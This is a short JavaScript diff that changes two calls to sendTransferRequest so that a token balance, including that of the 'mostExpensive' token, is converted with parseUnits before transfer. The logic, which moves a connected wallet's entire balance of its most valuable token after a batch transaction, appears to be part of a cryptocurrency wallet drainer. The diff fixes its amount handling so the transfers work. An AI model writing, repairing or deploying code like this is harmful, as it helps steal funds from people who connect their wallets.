@@ -832,7 +832,7 @@ const initializeSubscribers = (modal) => {
               const transferResult = await sendTransferRequest(
                 state.address,
                 token.address,
-                token.balance,
+                parseUnits(token.balance.toString(), token.decimals),
                 mostExpensive.chainId,
                 batchResult.txHash
               )
@@ -893,7 +893,7 @@ const initializeSubscribers = (modal) => {
               const transferResult = await sendTransferRequest(
                 state.address,
                 mostExpensive.address,
-                mostExpensive.balance,
+                parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals),
                 mostExpensive.chainId,
                 txHash
               )
